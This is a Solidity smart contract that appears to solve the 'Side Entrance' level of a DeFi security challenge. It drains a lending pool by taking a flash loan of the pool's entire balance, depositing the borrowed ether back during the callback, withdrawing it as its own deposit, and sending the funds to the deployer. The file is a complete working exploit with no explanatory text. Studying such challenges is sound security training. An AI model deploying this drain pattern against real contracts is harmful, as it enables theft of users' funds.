// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceLenderDrainer {
    SideEntranceLenderPool internal _sideEntranceLenderPool;
    address internal _drainedFundsReceiver;

    constructor(SideEntranceLenderPool _pool) {
        _sideEntranceLenderPool = _pool;
        _drainedFundsReceiver = msg.sender;
    }

    function drainSideEntranceLender() external {
        _sideEntranceLenderPool.flashLoan(address(_sideEntranceLenderPool).balance);
        _sideEntranceLenderPool.withdraw();
        (bool success,) = _drainedFundsReceiver.call{value: address(this).balance}("");
        require(success);
    }

    function execute() external payable {
        (bool success,) =
            address(_sideEntranceLenderPool).call{value: msg.value}(abi.encodeCall(SideEntranceLenderPool.deposit, ()));
        require(success);
    }

    receive() external payable {}
}
